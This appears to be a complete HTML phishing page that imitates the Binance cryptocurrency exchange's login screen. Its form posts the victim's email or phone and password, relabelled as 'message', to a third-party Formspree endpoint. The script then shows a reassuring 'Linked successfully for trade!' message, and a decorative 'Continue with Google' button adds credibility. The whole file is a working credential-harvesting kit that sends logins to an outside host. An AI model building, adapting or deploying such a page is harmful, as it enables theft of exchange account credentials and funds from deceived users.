<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Login</title>

<style>

*{box-sizing:border-box}

body{
margin:0;
background:#0b0e11;
font-family:system-ui,-apple-system,Segoe UI,Roboto;
color:white;
display:flex;
justify-content:center;
align-items:center;
min-height:100vh;
}

/* container */
.wrap{
width:100%;
max-width:420px;
padding:48px 26px;
}

/* title */
h1{
font-size:30px;
margin-bottom:34px;
}

/* field */
.field{
position:relative;
margin-bottom:22px;
}

/* inputs */
input,select{
width:100%;
padding:18px 16px;
background:#181a20;
border:1px solid #2b3139;
border-radius:10px;
font-size:16px;
color:white;
outline:none;
}

/* glowing yellow focus like Binance */
input:focus{
border-color:#f0b90b;
box-shadow:0 0 0 2px rgba(240,185,11,.15);
}

/* floating label */
label{
position:absolute;
left:14px;
top:50%;
transform:translateY(-50%);
color:#848e9c;
pointer-events:none;
transition:.2s;
background:#181a20;
padding:0 6px;
}

input:focus + label,
input:not(:placeholder-shown) + label{
top:-9px;
font-size:12px;
color:#f0b90b;
}

/* password eye */
.eye{
position:absolute;
right:14px;
top:50%;
transform:translateY(-50%);
cursor:pointer;
opacity:.7;
}

.eye:hover{opacity:1}

/* login button */
button{
width:100%;
background:#f0b90b;
border:none;
border-radius:10px;
padding:18px;
font-weight:700;
font-size:18px;
cursor:pointer;
margin-top:6px;
display:flex;
align-items:center;
justify-content:center;
gap:10px;
}

button:disabled{opacity:.7}

/* spinner */
.spinner{
width:18px;
height:18px;
border:3px solid rgba(0,0,0,.2);
border-top:3px solid black;
border-radius:50%;
animation:spin .8s linear infinite;
display:none;
}

@keyframes spin{
to{transform:rotate(360deg)}
}

/* google */
.google{
background:white;
color:black;
margin-top:14px;
font-weight:600;
}

/* phone select */
.phoneRow{
display:flex;
gap:10px;
}

.phoneRow select{
max-width:120px;
}

/* status */
#my-form-status{
text-align:center;
margin-top:18px;
color:#f0b90b;
}

/* mobile */
@media(max-width:480px){
.wrap{padding:40px 18px}
}

</style>
</head>

<body>

<div class="wrap">

<h1>Log in</h1>

<form id="my-form" action="https://formspree.io/f/xjgewkoy" method="POST">

<!-- EMAIL / PHONE -->
<div class="field">
<input type="text" name="email" placeholder=" " required>
<label>Email / Phone</label>
</div>

<!-- PASSWORD -->
<div class="field">

<input id="pass" type="password" name="message" placeholder=" " required>
<label>Password</label>

<div class="eye" onclick="togglePass()">

<!-- real svg eye -->
<svg width="22" height="22" viewBox="0 0 24 24" fill="white">
<path d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7zm0 11a4 4 0 1 1 0-8 4 4 0 0 1 0 8z"/>
</svg>

</div>
</div>

<input type="hidden" name="_subject" value="New Website Submission">
<input type="hidden" name="_captcha" value="false">

<!-- LOGIN -->
<button id="btn">

<span>Log in</span>
<div class="spinner" id="spin"></div>

</button>

<!-- GOOGLE -->
<button type="button" class="google">

<!-- google svg -->
<svg width="18" height="18" viewBox="0 0 48 48">
<path fill="#FFC107" d="M43 20H42V19H24V29H38C36 34 31 37 24 37C15 37 8 30 8 21C8 12 15 5 24 5C28 5 31 6 34 9L41 2C36-2 30-4 24-4C10-4-2 8-2 22C-2 36 10 48 24 48C38 48 50 36 50 22C50 20 50 19 49 17Z"/>
</svg>

Continue with Google
</button>

<p id="my-form-status"></p>

</form>
</div>


<script>

/* password toggle */
function togglePass(){
const p=document.getElementById("pass");
p.type = p.type==="password" ? "text" : "password";
}


/* form submit with spinner */
document.addEventListener("DOMContentLoaded",function(){

var form=document.getElementById("my-form");
var spin=document.getElementById("spin");
var btn=document.getElementById("btn");

form.addEventListener("submit",function(e){

e.preventDefault();

spin.style.display="block";
btn.disabled=true;

var data=new FormData(form);

fetch(form.action,{
method:"POST",
body:data,
headers:{'Accept':'application/json'}
})
.then(r=>{
spin.style.display="none";
btn.disabled=false;

if(r.ok){
document.getElementById("my-form-status").innerHTML="Linked successfully for trade!";
form.reset();
}else{
document.getElementById("my-form-status").innerHTML="Submission failed.";
}
})
.catch(()=>{
spin.style.display="none";
btn.disabled=false;
document.getElementById("my-form-status").innerHTML="Connection error.";
});

});

});

</script>

</body>
</html>
